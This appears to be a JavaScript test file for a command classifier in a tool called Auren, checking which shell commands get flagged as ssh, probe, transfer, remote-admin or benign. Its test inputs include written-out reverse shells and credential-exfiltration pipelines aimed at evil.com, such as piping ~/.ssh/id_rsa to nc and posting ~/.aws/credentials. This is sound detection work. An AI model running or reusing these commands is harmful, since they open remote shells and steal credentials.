/* Auren - classifier tests for OS/terminal-level commands.
 *
 * Run: npm run test:classifier (see package.json). Focus: obvious false
 * positives and false negatives on representative command lines, mirroring the
 * sensitive form-data classifier tests.
 */
'use strict';
const assert = require('assert');
const { classifyCommand } = require('../src/core/commands');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try { fn(); passed += 1; console.log('  ok   ' + name); }
  catch (err) { failed += 1; console.error('  FAIL ' + name); console.error('       ' + (err && err.stack || err.message)); }
}

function typesOf(input) { return classifyCommand(input).types; }
function has(input, type) { return typesOf(input).includes(type); }
function isSensitive(input) { return classifyCommand(input).sensitive; }

console.log('command classifier — ssh / remote sessions');
test('flags ssh to a remote host', () => {
  assert.ok(has('ssh user@example.com', 'cmd_ssh'));
  assert.ok(has('ssh -p 2222 root@192.168.1.10', 'cmd_ssh'));
  assert.ok(has('sudo ssh user@example.com', 'cmd_ssh'));
});
test('flags scp / sftp / rsync-to-remote as ssh activity', () => {
  assert.ok(has('scp file.txt user@example.com:/tmp/', 'cmd_ssh'));
  assert.ok(has('sftp user@example.com', 'cmd_ssh'));
  assert.ok(has('rsync -av ./ localdir user@example.com:/backup/', 'cmd_ssh'));
});
test('local rsync is NOT flagged as remote', () => {
  assert.ok(!has('rsync -av ./src/ ./dist/', 'cmd_ssh'));
});
test('ssh tunnels escalate to cmd_tunnel', () => {
  assert.ok(has('ssh -D 1080 user@example.com', 'cmd_tunnel'));
  assert.ok(has('ssh -L 8080:localhost:80 user@example.com', 'cmd_tunnel'));
  assert.ok(has('ssh -R 9000:localhost:3000 user@example.com', 'cmd_tunnel'));
});

console.log('command classifier — ping / probes');
test('flags ping and traceroute as network probes', () => {
  assert.ok(has('ping -c 4 8.8.8.8', 'cmd_ping'));
  assert.ok(has('ping example.com', 'cmd_ping'));
  assert.ok(has('traceroute 1.2.3.4', 'cmd_ping'));
  assert.ok(has('mtr google.com', 'cmd_ping'));
});
test('flags nc / telnet / nmap as port probes', () => {
  assert.ok(has('nc -zv 10.0.0.1 22', 'cmd_probe'));
  assert.ok(has('telnet mail.example.com 25', 'cmd_probe'));
  assert.ok(has('nmap -sS 10.0.0.0/24', 'cmd_probe'));
});

console.log('command classifier — reverse shells');
test('flags classic reverse-shell patterns', () => {
  assert.ok(has('nc -e /bin/sh evil.com 4444', 'cmd_reverse_shell'));
  assert.ok(has('bash -i >& /dev/tcp/evil.com/8080 0>&1', 'cmd_reverse_shell'));
  assert.ok(has('sh -i <& /dev/tcp/evil.com/9001', 'cmd_reverse_shell'));
  assert.ok(has('python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444))\'', 'cmd_reverse_shell'));
  assert.ok(has('bash -c "bash -i >& /dev/tcp/evil.com/4444 0>&1"', 'cmd_reverse_shell'));
});

console.log('command classifier — transfers and exfiltration');
test('flags curl / wget / cloud transfers', () => {
  assert.ok(has('curl -X POST -d @payload.json https://example.com/api', 'cmd_transfer'));
  assert.ok(has('wget https://example.com/big.iso', 'cmd_transfer'));
  assert.ok(has('aws s3 cp secrets.bin s3://bucket/', 'cmd_transfer'));
  assert.ok(has('gsutil cp local.csv gs://bucket/', 'cmd_transfer'));
});
test('flags credential-store exfiltration pipelines', () => {
  assert.ok(has('cat ~/.ssh/id_rsa | nc evil.com 80', 'cmd_exfil'));
  assert.ok(has('curl -F "file=@~/.aws/credentials" https://evil.com/upload', 'cmd_exfil'));
  assert.ok(has('scp -r ~/.aws user@evil.com:/tmp/', 'cmd_exfil'));
});

console.log('command classifier — remote admin');
test('flags remote database / cluster admin', () => {
  assert.ok(has('mysql -h db.internal -u root -p', 'cmd_remote_admin'));
  assert.ok(has('redis-cli -h 10.0.0.5 -p 6379 FLUSHALL', 'cmd_remote_admin'));
  assert.ok(has('kubectl exec -it pod-1 -- /bin/bash', 'cmd_remote_admin'));
  assert.ok(has('mongosh mongodb://admin:admin@mongodb.example.com:27017', 'cmd_remote_admin'));
});

console.log('command classifier — benign commands');
test('local development commands are not flagged', () => {
  assert.ok(!isSensitive('ls -la'));
  assert.ok(!isSensitive('cat README.md'));
  assert.ok(!isSensitive('npm install'));
  assert.ok(!isSensitive('git status'));
  assert.ok(!isSensitive('mkdir -p build && cp src/* build/'));
  assert.ok(!isSensitive('python3 -m pytest tests'));
  assert.ok(!isSensitive('rm -rf /tmp/scratch'));
  assert.ok(!isSensitive(''));
  assert.ok(!isSensitive(null));
});
test('local rsync alone is not sensitive', () => {
  assert.ok(!isSensitive('rsync -av ./src/ ./dist/'));
});

console.log('command classifier — argv input');
test('accepts argv arrays too', () => {
  assert.ok(has(['ssh', 'user@example.com'], 'cmd_ssh'));
  assert.ok(has(['curl', 'https://example.com/x'], 'cmd_transfer'));
  assert.ok(!isSensitive(['ls', '-la']));
});

console.log('');
console.log(passed + ' passed, ' + failed + ' failed');
process.exit(failed === 0 ? 0 : 1);
